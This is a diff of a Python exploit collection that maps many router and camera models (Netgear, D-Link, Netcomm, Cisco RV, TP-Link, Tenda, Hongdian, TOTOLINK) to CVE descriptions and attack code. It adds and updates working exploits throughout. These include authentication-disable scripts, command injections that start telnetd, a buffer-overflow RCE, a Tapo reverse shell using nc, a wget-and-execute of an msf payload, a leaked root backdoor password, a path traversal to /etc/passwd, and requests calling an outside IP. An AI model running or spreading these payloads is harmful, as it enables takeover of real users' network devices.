 		vurl = url + 'geniemanual.cgi'
 	else:
 		vurl = url + 'geniemanual.cgi?id=' + token
 
 	req = requests.post(vurl, verify=False)
 	time.sleep(1)
 	req = requests.post(vurl, verify=False)
 
-	print 'Authentication is enabled'
-	print 'Try: '+url+'BAS_basic.htm'
-	print 'Try: '+url+'MNU_accessPassword_recovered.htm'
+	print('Authentication is enabled')
+	print('Try: '+url+'BAS_basic.htm')
+	print('Try: '+url+'MNU_accessPassword_recovered.htm')
 
 
 if __name__ == '__main__':
 	if len(sys.argv) != 4:
-		print 'usage:'
-		print '1.python router.py ip port openauth'
-		print '2.python router.py ip port closeauth'
+		print('usage:')
+		print('1.python router.py ip port openauth')
+		print('2.python router.py ip port closeauth')
 		os._exit(0)
 
 	ip=sys.argv[1]
 	port=sys.argv[2]
 	func=sys.argv[3]
 
 	
@@ -1560,28 +1647,27 @@
 		token=get_token(url)
 		open_auth(token,url)
 	elif func=='closeauth':
 		url=get_url(ip, port)
 		token=get_token(url)
 		close_auth(token,url)
 	else:
-		print 'usage:'
-		print '1.python router.py ip port openauth'
-		print '2.python router.py ip port closeauth'
+		print('usage:')
+		print('1.python router.py ip port openauth')
+		print('2.python router.py ip port closeauth')
 		os._exit(0)
 """
 ]
 }
 
 
 model_exp_dic["Netgear_WNR1000v3"] = {
             "CVE-2019-17372":
 ["There is a large number of netgear devices with a genieDisableLanChanged.cgi page that can be accessed without authorization. After accessing this page, the device's authentication function will be turned off. Some devices need to set the correct token and send a POST type request to trigger the vulnerability.",
 """
-
 #!/usr/bin/env python
 
 import sys
 import time
 import os
 import requests
 from requests.packages.urllib3.exceptions import InsecureRequestWarning
@@ -1627,39 +1713,39 @@
 	else:
 		vurl = url + 'genieDisableLanChanged.cgi?id=' + token
 
 	req = requests.post(vurl, verify=False)
 	time.sleep(1)
 	req = requests.post(vurl, verify=False)
 
-	print 'Authentication is disabled'
-	print 'Try: '+url+'BAS_basic.htm'
-	print 'Try: '+url+'MNU_accessPassword_recovered.htm'
+	print('Authentication is disabled')
+	print('Try: '+url+'BAS_basic.htm')
+	print('Try: '+url+'MNU_accessPassword_recovered.htm')
 
 def open_auth(token,url):
 
 	if token == "Token maybe unnecessary":
 		vurl = url + 'geniemanual.cgi'
 	else:
 		vurl = url + 'geniemanual.cgi?id=' + token
 
 	req = requests.post(vurl, verify=False)
 	time.sleep(1)
 	req = requests.post(vurl, verify=False)
 
-	print 'Authentication is enabled'
-	print 'Try: '+url+'BAS_basic.htm'
-	print 'Try: '+url+'MNU_accessPassword_recovered.htm'
+	print('Authentication is enabled')
+	print('Try: '+url+'BAS_basic.htm')
+	print('Try: '+url+'MNU_accessPassword_recovered.htm')
 
 
 if __name__ == '__main__':
 	if len(sys.argv) != 4:
-		print 'usage:'
-		print '1.python router.py ip port openauth'
-		print '2.python router.py ip port closeauth'
+		print('usage:')
+		print('1.python router.py ip port openauth')
+		print('2.python router.py ip port closeauth')
 		os._exit(0)
 
 	ip=sys.argv[1]
 	port=sys.argv[2]
 	func=sys.argv[3]
 
 	
@@ -1669,26 +1755,25 @@
 		token=get_token(url)
 		open_auth(token,url)
 	elif func=='closeauth':
 		url=get_url(ip, port)
 		token=get_token(url)
 		close_auth(token,url)
 	else:
-		print 'usage:'
-		print '1.python router.py ip port openauth'
-		print '2.python router.py ip port closeauth'
+		print('usage:')
+		print('1.python router.py ip port openauth')
+		print('2.python router.py ip port closeauth')
 		os._exit(0)
 """
 ]
 }
 model_exp_dic["Netgear_WNDR4500v2"] = {
     "CVE-2019-17372":
 ["There is a large number of netgear devices with a genieDisableLanChanged.cgi page that can be accessed without authorization. After accessing this page, the device's authentication function will be turned off. Some devices need to set the correct token and send a POST type request to trigger the vulnerability.",
 """
-
 #!/usr/bin/env python
 
 import sys
 import time
 import os
 import requests
 from requests.packages.urllib3.exceptions import InsecureRequestWarning
@@ -1734,39 +1819,39 @@
 	else:
 		vurl = url + 'genieDisableLanChanged.cgi?id=' + token
 
 	req = requests.post(vurl, verify=False)
 	time.sleep(1)
 	req = requests.post(vurl, verify=False)
 
-	print 'Authentication is disabled'
-	print 'Try: '+url+'BAS_basic.htm'
-	print 'Try: '+url+'MNU_accessPassword_recovered.htm'
+	print('Authentication is disabled')
+	print('Try: '+url+'BAS_basic.htm')
+	print('Try: '+url+'MNU_accessPassword_recovered.htm')
 
 def open_auth(token,url):
 
 	if token == "Token maybe unnecessary":
 		vurl = url + 'geniemanual.cgi'
 	else:
 		vurl = url + 'geniemanual.cgi?id=' + token
 
 	req = requests.post(vurl, verify=False)
 	time.sleep(1)
 	req = requests.post(vurl, verify=False)
 
-	print 'Authentication is enabled'
-	print 'Try: '+url+'BAS_basic.htm'
-	print 'Try: '+url+'MNU_accessPassword_recovered.htm'
+	print('Authentication is enabled')
+	print('Try: '+url+'BAS_basic.htm')
+	print('Try: '+url+'MNU_accessPassword_recovered.htm')
 
 
 if __name__ == '__main__':
 	if len(sys.argv) != 4:
-		print 'usage:'
-		print '1.python router.py ip port openauth'
-		print '2.python router.py ip port closeauth'
+		print('usage:')
+		print('1.python router.py ip port openauth')
+		print('2.python router.py ip port closeauth')
 		os._exit(0)
 
 	ip=sys.argv[1]
 	port=sys.argv[2]
 	func=sys.argv[3]
 
 	
@@ -1776,17 +1861,17 @@
 		token=get_token(url)
 		open_auth(token,url)
 	elif func=='closeauth':
 		url=get_url(ip, port)
 		token=get_token(url)
 		close_auth(token,url)
 	else:
-		print 'usage:'
-		print '1.python router.py ip port openauth'
-		print '2.python router.py ip port closeauth'
+		print('usage:')
+		print('1.python router.py ip port openauth')
+		print('2.python router.py ip port closeauth')
 		os._exit(0)
 """
 ]
 }
 
 model_exp_dic["Xiaomi_AX3600"] = {
     "CVE-2020-11959":
@@ -1820,77 +1905,77 @@
 }
 
 model_exp_dic['Netgear_R6700'] = {
     
 }
 
 model_exp_dic["DIR-859"] = {
-    "CVE-2019–17621":
+    "CVE-2019-17621":
 ["The UPnP endpoint URL /gena.cgi in the D-Link DIR-859 Wi-Fi router 1.05 and 1.06B01 Beta01 allows an Unauthenticated remote attacker to execute system commands as root, by sending a specially crafted HTTP SUBSCRIBE request to the UPnP service when connecting to the local network.\n['http://packetstormsecurity.com/files/156054/D-Link-DIR-859-Unauthenticated-Remote-Command-Execution.html'\n'https://medium.com/@s1kr10s/d-link-dir-859-rce-unautenticated-cve-2019-17621-en-d94b47a15104'\n'https://supportannouncement.us.dlink.com/announcement/publication.aspx?name=SAP10146']",
  """
 import socket
 import os
 from time import sleep
 # Exploit By Miguel Mendez & Pablo Pollanco
 def httpSUB(server, port, shell_file):
-    print('\n[*] Connection {host}:{port}').format(host=server, port=port)
+    print('\\n[*] Connection {host}:{port}'.format(host=server, port=port))
     con = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    request = "SUBSCRIBE /gena.cgi?service=" + str(shell_file) + " HTTP/1.0\n"
-    request += "Host: " + str(server) + str(port) + "\n"
-    request += "Callback: <http://192.168.0.4:34033/ServiceProxy27>\n"
-    request += "NT: upnp:event\n"
-    request += "Timeout: Second-1800\n"
-    request += "Accept-Encoding: gzip, deflate\n"
-    request += "User-Agent: gupnp-universal-cp GUPnP/1.0.2 DLNADOC/1.50\n\n"
-sleep(1)
+    request = "SUBSCRIBE /gena.cgi?service=" + str(shell_file) + " HTTP/1.0\\n"
+    request += "Host: " + str(server) + str(port) + "\\n"
+    request += "Callback: <http://192.168.0.4:34033/ServiceProxy27>\\n"
+    request += "NT: upnp:event\\n"
+    request += "Timeout: Second-1800\\n"
+    request += "Accept-Encoding: gzip, deflate\\n"
+    request += "User-Agent: gupnp-universal-cp GUPnP/1.0.2 DLNADOC/1.50\\n\\n"
+    sleep(1)
     print('[*] Sending Payload')
     con.connect((socket.gethostbyname(server),port))
     con.send(request.encode())
     results = con.recv(4096)
-sleep(1)
+    sleep(1)
     print('[*] Running Telnetd Service')
     sleep(1)
-    print('[*] Opening Telnet Connection\n')
+    print('[*] Opening Telnet Connection\\n')
     sleep(2)
     os.system('telnet ' + str(server) + ' 9999')
-serverInput = raw_input('IP Router: ')
-portInput = 49152
-httpSUB(serverInput, portInput, '`telnetd -p 9999 &`')
+    serverInput = raw_input('IP Router: ')
+    portInput = 49152
+    httpSUB(serverInput, portInput, '`telnetd -p 9999 &`')
  """
  ],
     "CVE-2019-20215":
 ["D-Link DIR-859 1.05 and 1.06B01 Beta01 devices allow remote attackers to execute arbitrary OS commands via a urn: to the M-SEARCH method in ssdpcgi() in /htdocs/cgibin, because HTTP_ST is mishandled. The value of the urn: service/device is checked with the strstr function, which allows an attacker to concatenate arbitrary commands separated by shell metacharacters.\n['http://packetstormsecurity.com/files/156250/D-Link-ssdpcgi-Unauthenticated-Remote-Command-Execution.html'\n'https://medium.com/@s1kr10s/d-link-dir-859-unauthenticated-rce-in-ssdpcgi-http-st-cve-2019-20215-en-2e799acb8a73'\n'https://supportannouncement.us.dlink.com/announcement/publication.aspx?name=SAP10147']",
 """
 import sys
 import os
 import socket
 from time import sleep
 # Exploit By Miguel Mendez - @s1kr10s
 def config_payload(ip, port):
-    header = "M-SEARCH * HTTP/1.1\n"
-    header += "HOST:"+str(ip)+":"+str(port)+"\n"
-    header += "ST:urn:device:1;telnetd\n"
-    header += "MX:2\n"
-    header += 'MAN:"ssdp:discover"'+"\n\n"
+    header = "M-SEARCH * HTTP/1.1\\n"
+    header += "HOST:"+ str(ip) + ":" +str(port)+"\\n"
+    header += "ST:urn:device:1;telnetd\\n"
+    header += "MX:2\\n"
+    header += 'MAN:"ssdp:discover"'+"\\n\\n"
     return header
 def send_conexion(ip, port, payload):
     sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM,socket.IPPROTO_UDP)
     sock.setsockopt(socket.IPPROTO_IP,socket.IP_MULTICAST_TTL,2)
     sock.sendto(payload,(ip, port))
     sock.close()
 if __name__== "__main__":
     ip = raw_input("Router IP: ")
     port = 1900
-print("\n---= HEADER =---\n")
+    print("\\n---= HEADER =---\\n")
     headers = config_payload(ip, port)
     print("[+] Preparando Header ...")
     print("[+] Enviando payload ...")
     print("[+] Activando servicio telnetd :)") 
     send_conexion(ip, port, headers)
-    print("[+] Conectando al servicio ...\n")
+    print("[+] Conectando al servicio ...\\n")
     sleep(5)
     os.system('telnet ' + str(ip))
 """
  ],
     "CVE-2019-20216":
 ["D-Link DIR-859 1.05 and 1.06B01 Beta01 devices allow remote attackers to execute arbitrary OS commands via the urn: to the M-SEARCH method in ssdpcgi() in /htdocs/cgibin, because REMOTE_PORT is mishandled. The value of the urn: service/device is checked with the strstr function, which allows an attacker to concatenate arbitrary commands separated by shell metacharacters.",
 """
@@ -2159,16 +2244,16 @@
  ]
 }
 
 
 model_exp_dic["Netcomm_NF20"] = {
     "CVE-2022-4873":
 ["On Netcomm router models NF20MESH, NF20, and NL1902 a stack based buffer overflow affects the sessionKey parameter. By providing a specific number of bytes, the instruction pointer is able to be overwritten on the stack and crashes the application at a known location.\n['https://github.com/scarvell/advisories/blob/main/2022_netcomm_nf20mesh_unauth_rce.md']",
- '''
- #!/usr/bin/python3
+'''
+#!/usr/bin/python3
 """
 Netcomm NF20MESH Unauthenticated RCE
 Author: Brendan Scarvell
 Vulnerable versions: <= R6B021
 
 A stack based buffer overflow exists in the sessionKey query string parameter. An authentication bypass
 was also discovered by providing /.css/ in the request path. Chaining both of the two bugs together
@@ -2232,15 +2317,15 @@
 
 while not pwned:
     try:
         r = requests.get(f"http://{TARGET}/.css/rtroutecfg.cgi?defaultGatewayList=ppp0.3&dfltGw6Ifc=&sessionKey={buf}", timeout=5, headers=headers)
 
     except requests.exceptions.ConnectionError:
         # successful exploitation hangs connection. Capture timeout so we dont hang forever
-        print("\n[*] got hit on libc @ 0xb65d9000")
+        print("\\n[*] got hit on libc @ 0xb65d9000")
     
     try:
         tn = telnetlib.Telnet(TARGET, 31337)
         if (tn):
             pwned = True
             print("[*] popping shell")
             time.sleep(2)
@@ -2443,15 +2528,148 @@
 
 def main(*args):
     server.start(port=80)
 
 if __name__ == "__main__":
     main()
  """
-]
+],
+    "CVE-2022-20705&&CVE-2022-20707":
+    ["Multiple vulnerabilities in Cisco Small Business RV160, RV260, RV340, and RV345 Series Routers could allow an attacker to do any of the following: Execute arbitrary code Elevate privileges Execute arbitrary commands Bypass authentication and authorization protections Fetch and run unsigned software Cause denial of service (DoS) For more information about these vulnerabilities, see the Details section of this advisory.\n['http://packetstormsecurity.com/files/170988/Cisco-RV-Series-Authentication-Bypass-Command-Injection.html'\n'https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-smb-mult-vuln-KA9PK6D']",
+"""
+from urllib3 import  encode_multipart_formdata
+import  requests
+import _thread
+import argparse
+
+class Upload():
+    def __init__(self,target_ip,target_port,Command,SSL_C):
+        self.ip=target_ip
+        self.port=target_port
+        self.cmd=Command
+        self.boundary="----WebKitFormBoundaryz6gIo5kcTkAlkCwX"
+        self.post_data=''
+        self.rq_header=''
+        self.ssl_c=SSL_C
+        self.generate_headers()
+        self.generate_payload()
+        self.Detect_Vuln()
+
+    def generate_payload(self):
+        boundary=self.boundary
+        fields = [("sessionid",(None,"EU6DJKEIWO",None)),
+                  ("file.path",(None,"doudoudedi",None)),
+                  ("filename",(None,"esp_test.xml",None)),
+                  ("pathparam",(None,"Firmware",None)),
+                  ("destination",(None,"x';{0};'".format(self.cmd),None)),
+                  ("option",(None,"x",None)),
+                  ("file", ("1.img", b'test', "Content-Type: application/octet-stream"))]
+        m = encode_multipart_formdata(fields, boundary=boundary)
+        self.post_data=m[0]
+
+    def generate_headers(self):
+        self.rq_header={
+            "Host":self.ip+":"+str(self.port),
+            "Content-Length":"955",
+            "Accept":"application/json, text/plain, */*",
+            "optional-header":"header-value",
+            "User-Agent":"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0",
+            "Content-Type":"multipart/form-data; boundary="+self.boundary,
+            "Accept-Encoding":"gzip, deflate",
+            "Accept-Language":"zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7",
+            "Cookie":"sessionid=../../../etc/passwd;sessionid=Y2lzY28vMTI3LjAuMC4xLzEx;",
+            "Connection":"close"
+        }
+    def Detect_Vuln(self):
+        boundary=self.boundary
+        fields = [("sessionid",(None,"EU6DJKEIWO",None)),
+                  ("file.path",(None,"doudoudedi",None)),
+                  ("filename",(None,"esp_test.xml",None)),
+                  ("pathparam",(None,"Firmware",None)),
+                  ("destination",(None,"x';id;'",None)),
+                  ("option",(None,"x",None)),
+                  ("file", ("1.img", b'test', "Content-Type: application/octet-stream"))]
+        m = encode_multipart_formdata(fields, boundary=boundary)
+        if self.ssl_c == 1:
+            try:
+                attack_url = "https://" + self.ip + ":" + str(self.port) + "/upload"
+                #proxies = {'http': 'http://127.0.0.1:8080' , 'https': 'http://127.0.0.1:8080'}
+                res = requests.post(attack_url, headers=self.rq_header, data=m[0], verify=False)#,proxies=proxies )
+                #print(res.text)
+                if "301 Moved Permanently" in res.text:
+                    print("Vulnerability exists")
+                if "www-data" in res.text:
+                    print("Vulnerability exists id Command is test")
+                    print(res.text)
+                else:
+                    print("faile hahah")
+                    print(res.text)
+            except Exception as e:
+                print(e)
+        else:
+            try:
+                attack_url = "http://" + self.ip + ":" + str(self.port) + "/upload"
+                res = requests.post(attack_url, headers=self.rq_header, data=m[0])
+                if "301 Moved Permanently" in res.text:
+                    print("Vulnerability exists")
+                if "www-data" in res.text:
+                    print("Vulnerability exists id Command is test")
+                    print(res.text)
+                else:
+                    print("faile")
+                    print(res.text)
+            except Exception as e:
+                print(e)
+
+    def attack(self):
+        if self.ssl_c == 1:
+            try:
+                attack_url="https://"+self.ip+":"+str(self.port)+"/upload"
+                print(attack_url)
+                res=requests.post(attack_url,headers=self.rq_header,data=self.post_data,verify=False)
+                if "301 Moved Permanently" in res.text:
+                    print("cmd execute success")
+                else:
+                    print("faile")
+                    print(res.text)
+            except Exception as e:
+                print("error: " +e)
+        else:
+            try:
+                attack_url="http://"+self.ip+":"+str(self.port)+"/upload"
+                res = requests.post(attack_url, headers=self.rq_header, data=self.post_data)
+                if "301 Moved Permanently" in res.text:
+                    print("cmd execute success")
+                else:
+                    print("faile")
+                    print(res.text)
+            except Exception as e:
+                print(e)
+
+
+if __name__=="__main__":
+    '''
+    Privilege Escalation
+        echo 'www-data ALL=(ALL) NOPASSWD: ALL'>/tmp/www-data-sudo
+        /usr/bin/confd_cli -U 0 -G 0 -u root -g root
+        append /etc/sudoers
+        sudo /bin/sh
+    '''
+    print("RV34X<=1.0.03.24,RV160/260<=1.0.01.05 POC by doudou")
+    parser = argparse.ArgumentParser()
+    parser.add_argument('--rhost', required=True, type=str, default=None, help='Remote Target Address (IP/FQDN)')
+    parser.add_argument('--rport', required=False, type=int, default=80, help='Remote Target Port')
+    parser.add_argument('--SSL', required=False, type=int, default=0, help='SSL 1 is HTTPS or HTTP')
+    parser.add_argument('--cmd', required=False, type=str, default=None, help='Command Execute')
+    args = parser.parse_args()
+    exp=Upload(args.rhost,args.rport,args.cmd,args.SSL)
+    exp.attack()
+
+"""     
+     ]
 }
 
 
 #model_exp_dic["Netgear_WNDR3700v4"]  = {
 #    "":
 #        []
 #}
@@ -2716,8 +2934,527 @@
 #sudo service tftp-hpa restart
 #mv CVE-2023-27078 nart.out
 #retstart router
 #!/bin/sh  
 tftp -g 192.168.0.100 -r busybox -l /tmp/busybox;chmod +x /tmp/busybox;/tmp/busybox nc -lvp 8888 -e /bin/sh
  """
  ]
+}
+
+model_exp_dic["TP-Link_Archer_AX21"] = {
+    "CVE-2023-1389":
+["TP-Link Archer AX21 (AX1800) firmware versions before 1.1.4 Build 20230219 contained a command injection vulnerability in the country form of the /cgi-bin/luci;stok=/locale endpoint on the web management interface. Specifically, the country parameter of the write operation was not sanitized before being used in a call to popen(), allowing an unauthenticated attacker to inject commands, which would be run as root, with a simple POST request.\n['https://www.tenable.com/security/research/tra-2023-11']",
+ """
+#Sending a request similar to the following twice in a row would run the $(id>/tmp/out) command on the second request, creating the /tmp/out file containing the output of the id command. 
+POST /cgi-bin/luci/;stok=/locale?form=country HTTP/1.1
+Host: <target router>
+Content-Type: application/x-www-form-urlencoded
+
+operation=write&country=$(id>/tmp/out)
+ """
+ ]
+}
+
+model_exp_dic["TRENDnet_TEW-755AP"] = {
+    "CVE-2022-46596":
+["TRENDnet TEW755AP 1.13B01 was discovered to contain a stack overflow via the del_num parameter in the icp_delete_img (sub_41DEDC) function.\n['https://brief-nymphea-813.notion.site/Vul6-TEW755-bof-icp_delete_img-ed2df4b6b4f74520bda8adead2d0d651']",
+ """
+import requests
+url = "http://192.168.17.221:80/apply.cgi"
+cookie = {"Cookie":"uid=1234"}
+data = { 
+    'action' : "icp_delete_img",
+    "del_num" : "a" * 0x1000
+}
+response = requests.post(url, cookies=cookie, data=data)
+print(response.text)
+print(response)
+ """
+ ]
+}
+
+
+model_exp_dic["Hongdian_H8922"] = {
+    "CVE-2021-28149":
+["Hongdian H8922 3.0.5 devices allow Directory Traversal. The /log_download.cgi log export handler does not validate user input and allows a remote attacker with minimal privileges to download any file from the device by substituting ../ (e.g., ../../etc/passwd) This can be carried out with a web browser by changing the file name accordingly. Upon visiting log_download.cgi?type=../../etc/passwd and logging in, the web server will allow a download of the contents of the /etc/passwd file\n['http://en.hongdian.com/Products/Details/H8922'\n'https://ssd-disclosure.com/ssd-advisory-hongdian-h8922-multiple-vulnerabilities/']",
+ """
+ http://[ip]/log_download.cgi?type=../../etc/passwd
+ """
+ ],
+    "CVE-2021-28150":
+["Hongdian H8922 3.0.5 devices allow the unprivileged guest user to read cli.conf (with the administrator password and other sensitive data) via /backup2.cgi.\n['http://en.hongdian.com/Products/Details/H8922\nhttps://ssd-disclosure.com/ssd-advisory-hongdian-h8922-multiple-vulnerabilities/']",
+ """
+ #username guest password guest
+ #leak admin password
+ http://173.182.71.235/backup2.cgi
+ """
+ ],
+    "CVE-2021-28151":
+["Hongdian H8922 3.0.5 devices allow OS command injection via shell metacharacters into the ip-address (aka Destination) field to the tools.cgi ping command, which is accessible with the username guest and password guest.",
+ """
+ system->netwrok
+ ps;
+ """
+ ],
+    "CVE-2021-28152":
+["Hongdian H8922 3.0.5 devices have an undocumented feature that allows access to a shell as a superuser. To connect, the telnet service is used on port 5188 with the default credentials of root:superzxmn.",
+ """
+ telnet ip 5188
+ username: root
+ password: superzxmn
+ """
+ ]
+}
+
+model_exp_dic["DIR-866L"] = {
+    "CVE-2019-16920":
+["Unauthenticated remote code execution occurs in D-Link products such as DIR-655C, DIR-866L, DIR-652, and DHP-1565. The issue occurs when the attacker sends an arbitrary input to a \"PingTest\" device common gateway interface that could lead to common injection. An attacker who successfully triggers the command injection could achieve full system compromise. Later, it was independently found that these are also affected: DIR-855L, DAP-1533, DIR-862L, DIR-615, DIR-835, and DIR-825.\n['https://www.seebug.org/vuldb/ssvid-98079\nhttps://www.kb.cert.org/vuls/id/766427\nhttps://medium.com/@80vul/determine-the-device-model-affected-by-cve-2019-16920-by-zoomeye-bf6fec7f9bb3'],",
+ """
+#unauth rce
+POST /apply_sec.cgi HTTP/1.1
+Host: 192.168.232.128
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:69.0) Gecko/20100101 Firefox/69.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: vi-VN,vi;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 131
+Connection: close
+Referer: http://192.168.232.128/login_pic.asp
+Cookie: uid=1234123
+Upgrade-Insecure-Requests: 1
+html_response_page=login_pic.asp&action=ping_test&ping_ipaddr=127.0.0.1%0awget%20-P%20/tmp/%20http://45.76.148.31:4321/?$(echo 1234)
+ """
+ ]
+}
+
+
+model_exp_dic["DIR-862L"] = {
+    "CVE-2019-16920":
+["Unauthenticated remote code execution occurs in D-Link products such as DIR-655C, DIR-866L, DIR-652, and DHP-1565. The issue occurs when the attacker sends an arbitrary input to a \"PingTest\" device common gateway interface that could lead to common injection. An attacker who successfully triggers the command injection could achieve full system compromise. Later, it was independently found that these are also affected: DIR-855L, DAP-1533, DIR-862L, DIR-615, DIR-835, and DIR-825.\n['https://www.seebug.org/vuldb/ssvid-98079\nhttps://www.kb.cert.org/vuls/id/766427\nhttps://medium.com/@80vul/determine-the-device-model-affected-by-cve-2019-16920-by-zoomeye-bf6fec7f9bb3'],",
+ """
+#unauth rce
+POST /apply_sec.cgi HTTP/1.1
+Host: 192.168.232.128
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:69.0) Gecko/20100101 Firefox/69.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: vi-VN,vi;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 131
+Connection: close
+Referer: http://192.168.232.128/login_pic.asp
+Cookie: uid=1234123
+Upgrade-Insecure-Requests: 1
+html_response_page=login_pic.asp&action=ping_test&ping_ipaddr=127.0.0.1%0awget%20-P%20/tmp/%20http://45.76.148.31:4321/?$(echo 1234)
+ """
+ ]
+}
+
+
+model_exp_dic["TOTOLINK_A3000RU"] = {
+    "TOTOLINK_A3000RU_downloadFlile_rce":
+    ["TOTOLINK_A300RU unauth rce vuln",
+"""
+GET /cgi-bin/downloadFlile.cgi?;wget${IFS}http://192.168.0.111:801/mm.txt;=hahah HTTP/1.1
+"""
+     ]
+}
+
+model_exp_dic["TP-Link_Tapo_c200"] = {
+    "CVE-2021-4045":
+        ["TP-Link Tapo C200 IP camera, on its 1.1.15 firmware version and below, is affected by an unauthenticated RCE vulnerability, present in the uhttpd binary running by default as root. The exploitation of this vulnerability allows an attacker to take full control of the camera.\n['http://packetstormsecurity.com/files/168472/TP-Link-Tapo-c200-1.1.15-Remote-Code-Execution.html'\n'https://www.incibe-cert.es/en/early-warning/security-advisories/tp-link-tapo-c200-remote-code-execution-vulnerability']",
+"""
+#python3 pwntapo.py shell 192.168.1.79 192.168.1.41
+import requests, urllib3, sys, threading, os, hashlib
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+PORT = 1337
+REVERSE_SHELL = 'rm /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc %s %d >/tmp/f'
+NC_COMMAND = 'nc -lv %d' % PORT
+
+RTSP_USER = 'pwned1337'
+RTSP_PASSWORD = 'pwned1337'
+RTSP_CIPHERTEXT = 'RUW5pUYSBm4gt+5T7bzwEq5r078rcdhSvpJrmtqAKE2mRo8bvvOLfYGnr5GNHfANBeFNEHhucnsK86WJTs4xLEZMbxUS73gPMTYRsEBV4EaKt2f5h+BkSbuh0WcJTHl5FWMbwikslj6qwTX48HasSiEmotK+v1N3NLokHCxtU0k='
+
+if (len(sys.argv) < 4) or (sys.argv[1] != 'shell' and sys.argv[1] != 'rtsp'):
+    print("[x] Usage: python3 pwnTapo.py [shell|rtsp] [victim_ip] [attacker_ip]")
+    print()
+    exit()
+
+victim = sys.argv[2]
+attacker = sys.argv[3]
+url = "https://" + victim + ":443/"
+
+if sys.argv[1] == 'shell':
+    print("[+] Listening on port %d..." % PORT)
+    t = threading.Thread(target=os.system, args=(NC_COMMAND,))
+    t.start()
+
+    print("[+] Sending reverse shell to %s...\\n" % victim)
+    json = {"method": "setLanguage", "params": {"payload": "';" + REVERSE_SHELL % (attacker, PORT) + ";'"}}
+    requests.post(url, json=json, verify=False)
+
+elif sys.argv[1] == 'rtsp':
+    print("[+] Setting up RTSP video stream...")
+    md5_rtsp_password = hashlib.md5(RTSP_PASSWORD.encode()).hexdigest().upper()
+    json = {"method": "setLanguage", "params": {"payload": "';uci set user_management.third_account.username=%s;uci set user_management.third_account.passwd=%s;uci set user_management.third_account.ciphertext=%s;uci commit user_management;/etc/init.d/cet terminate;/etc/init.d/cet resume;'" % (RTSP_USER, md5_rtsp_password, RTSP_CIPHERTEXT)}}
+    requests.post(url, json=json, verify=False)
+
+    print("[+] RTSP video stream available at rtsp://%s/stream2" % victim)
+    print("[+] RTSP username: %s" % RTSP_USER)
+    print("[+] RTSP password: %s" % RTSP_PASSWORD)
+"""
+         ]
+}
+
+
+model_exp_dic["DIR-890L"] = {
+    "CVE-2023-30063":
+["D-Link DIR-890L FW1.10 A1 is vulnerable to Authentication bypass.\n['https://github.com/Zarathustra-L/IoT_Vul/tree/main/D-Link/DIR-890L/Auth%20bypass'\n'https://www.dlink.com/en/security-bulletin/']",
+ """
+curl  http://192.168.0.1/getcfg.php?Z=Z%0a_POST_SERVICES%3dDEVICE.ACCOUNT%0aAUTHORIZED_GROUP%3d0
+ """
+ ]
+}
+
+model_exp_dic["tenda_AC15"] = {
+    "CVE-2021-44971":
+    ["Multiple Tenda devices are affected by authentication bypass, such as AC15V1.0 Firmware V15.03.05.20_multi?AC5V1.0 Firmware V15.03.06.48_multi and so on. an attacker can obtain sensitive information, and even combine it with authenticated command injection to implement RCE.\n['https://github.com/21Gun5/my_cve/blob/main/tenda/bypass_auth.md'\n'http://tenda.com/']", 
+"""
+while url include string "img/main-logo.png", will return to nomal——authentication bypass
+
+like:
+GET /goform/GetRouterStatus?img/main-logo.png HTTP/1.1
+''''
+
+"""
+],
+    "CVE-2020-10987":
+    ["The goform/setUsbUnload endpoint of Tenda AC15 AC1900 version 15.03.05.19 allows remote attackers to execute arbitrary system commands via the deviceName POST parameter.\n['https://blog.securityevaluators.com/tenda-ac1900-vulnerabilities-discovered-and-exploited-e8e26aa0bc68'\n'https://www.ise.io/research/']",
+"""
+#!/usr/bin/python3
+
+from pwn import *
+import requests
+from threading import Thread
+
+cmd  = b'wget http://192.168.2.1:8000/tools/msf -O /msf;'
+cmd += b'chmod 777 /msf;'
+cmd += b'/msf'
+
+assert(len(cmd) < 255)
+
+url = b"http://192.168.2.2/login/Auth"
+payload = b"http://192.168.2.2/goform/setUsbUnload/?deviceName=;%20" + cmd
+
+data = {
+    "username": "admin",
+    "password": "admin",
+}
+
+def attack():
+    s = requests.session()
+    s.post(url=url, data=data)
+    s.post(url=payload, data=data)
+
+thread = Thread(target=attack)
+thread.start()
+
+io = listen(31337)
+io.wait_for_connection()
+log.success("getshell")
+io.interactive()
+"""
+    ]
+}
+
+model_exp_dic["DSL-3782"] = {
+    "CVE-2023-27216":
+["An issue found in D-Link DSL-3782 v.1.03 allows remote authenticated users to execute arbitrary code as root via the network settings page.\n['https://lessonsec.com/cve/cve-2023-27216/']",
+"""
+#name=doudou222;cmd;
+#
+POST /cgi-bin/New_GUI/VirtualServer.asp HTTP/1.1
+Host: 192.168.1.1
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Content-Length: 270
+Origin: http://192.168.1.1
+Connection: close
+Referer: http://192.168.1.1/cgi-bin/New_GUI/VirtualServer.asp
+
+sessionKey=783368690&conn_type=ATM&buttonType=apply&editRow=0&enable_rules=Yes&scheduleValue=-&inner_display=0&enable0=&enable_vs_rules_ck=on&name=doudou222;cmd;&inIP=192.168.1.8&insPort=8888&inePort=9999&exsPort=8088&exePort=9000&protocol=ALL&pf_Schedule=Always
+"""
+ ],
+    "CVE-2018-8898":
